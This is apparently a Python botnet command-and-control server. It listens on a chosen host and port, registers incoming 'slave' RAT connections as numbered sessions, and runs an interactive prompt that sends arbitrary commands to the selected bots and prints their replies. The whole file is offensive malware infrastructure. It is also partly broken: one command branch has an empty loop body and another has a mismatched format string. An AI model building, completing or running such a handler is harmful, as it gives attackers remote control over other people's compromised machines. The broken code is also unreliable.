#!/usr/bin/python3

import socket
import sys
import os
import threading
import queue
import time

q = queue.Queue()

Socketthread = []           # Stores all BotHandler instances
ActiveConnections = []      # Stores all currently active BotHandler sessions
ClientAddressList = {}      # Stores client_address[] info (IP, Port): IP is stored in string format, port is not
Sessions = []

# -------------------------------------------------------------------------------------------

class BotHandler(threading.Thread):

    def __init__(self, client, client_address, active, bot_id, qv):
        threading.Thread.__init__(self)
        self.client = client
        self.client_address = client_address
        self.ip = client_address[0]
        self.port = client_address[1]
        self.isActive = active
        self.bot_id = bot_id
        self.q = qv

        # This line returns 'MainThread'
        #self.BotName = threading.current_thread().getName()

    def run(self):

        # Returns 'Thread-#': Useful for specific interaction?
        # This specific line returns 'None'
        #self.BotName = threading.current_thread().getName()

        print("[* BotHandler-Msg] Slave " + self.ip + ":" + str(self.port) + " connected with Session ID of " + str(self.bot_id))

        # [NIX'D] - Interesting, we can use strings (Thread-#) to index an array. Noted...
        ClientAddressList[self.bot_id] = self.client_address
        # [NIX'D] - This is a useful array in which we can access Client information (IP, Port) by thread-id

        while True:

            if(self.isActive):
                RecvBotCmd = self.q.get()           # Pulls cmds from queue to be executed

                print("\n[* BotHandler-Msg] Received Command: " + RecvBotCmd + " for bot " + str(self.bot_id))

                try:
                    #RecvBotCmd += "\n"

                    # Send data/command to RAT
                    self.client.send(RecvBotCmd.encode('utf-8'))
                    recvVal = (self.client.recv(1024)).decode('utf-8')      # Receive reply from RAT

                    print(recvVal)                                          # Display message received

                except Exception as ex:
                    # for t in Socketthread:
                    #     if t.is_alive() == False:
                    #         print("\n[!] Died Thread: " + str(t))
                    #         t.join()
                    print(ex)
                    break
    
    def activate(self):
        print("\n[*BotHandler-Msg] Activating Bot " + str(self.bot_id) + "...")
        self.isActive = True
    
    def deactivate(self):
        print("\n[*BotHandler-Msg] Deactivating " + str(self.bot_id) + "...")
        self.isActive = False

    def isActivated(self):
        return self.isActive
    
    def getID(self):
        return self.bot_id

# -------------------------------------------------------------------------------------------

class BotCmd(threading.Thread):
    def __init__(self, qv2):
        threading.Thread.__init__(self)     # Spawn a new thread for itself
        self.q = qv2                        # Queue used for issuing commands

    def run(self):

        while True:

            cmd = str(input("BotCmd> "))

            if (cmd == ""):
                print("No command received. Try again...")
                pass
            elif (cmd == "exit"):
                for i in range(len(Socketthread)):
                    time.sleep(0.1)
                    self.q.put(cmd)

                print("Exiting - Please wait...")
                time.sleep(5)
                os._exit(0)
            elif (cmd == "list-active"):
                for session in Sessions:


            elif (cmd == "list-all"):
                for conn in ActiveConnections:
                    print("| Session: %3d | %20s |"% (conn.getID(), ))

            elif (cmd == "select"):

                selectedIDs = [int(n) for n in input('Enter IDs (seperated by spaces): ').split()]
                print("ID list obtained: " + str(selectedIDs))

                
                
                for handler in Socketthread:
                    print("Handler: ", str(handler))

                    if handler.getID() in selectedIDs:
                        print("Activating Bot " + str(selectedIDs))
                        handler.activate()
                        ActiveConnections.append(handler)
                    else:
                        print("Bot not found...")

                #print("Interacting with Bot " + str(selectedIDs) + "...")

            #elif (cmd == "deselect"):

            else:
                print("[+] Sending Command: " + cmd + " to " + str(len(Socketthread)) + " bots")
                for i in range(len(ActiveConnections)):                                         # for i in range(len(Socketthread)):
                    time.sleep(0.1)
                    self.q.put(cmd)

# --------------------------------------------------------------------------------------------------------------------------

def listener(lhost, lport, q):

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_address = (lhost, lport)
    server.bind(server_address)
    server.listen(10)

    print("[+] Starting Botnet listener on tcp://" + lhost + ":" + str(lport) + "\n")

    BotCmdThread = BotCmd(q)        # Handles interface, queue is for commands
    BotCmdThread.start()

    session_record = 0

    while True:

        (client, client_address) = server.accept()  # start listening
        print("Connection received from " + str(client_address[0]))

        # BotHandler = Multiconn, a new BotHandler is spawned for each incoming connection
        newthread = BotHandler(client, client_address, False, session_record, q)
        Socketthread.append(newthread)
        session_record += 1
        newthread.start()

# -------------------------------------------------------------------------------------------
#import
def main():
    if (len(sys.argv) < 3):
        print("[!] Usage:\n  [+] python3 " + sys.argv[0] + " <LHOST> <LPORT>\n  [+] Eg.: python3 " + sys.argv[0] + " 0.0.0.0 8080\n")
    else:
        try:
            lhost=sys.argv[1]
            lport=int(sys.argv[2])
            listener(lhost, lport, q)
        except Exception as ex:
            print("\n[-] Unable to run the handler. Reason: " + str(ex) + "\n")

if __name__ == '__main__':
    main()
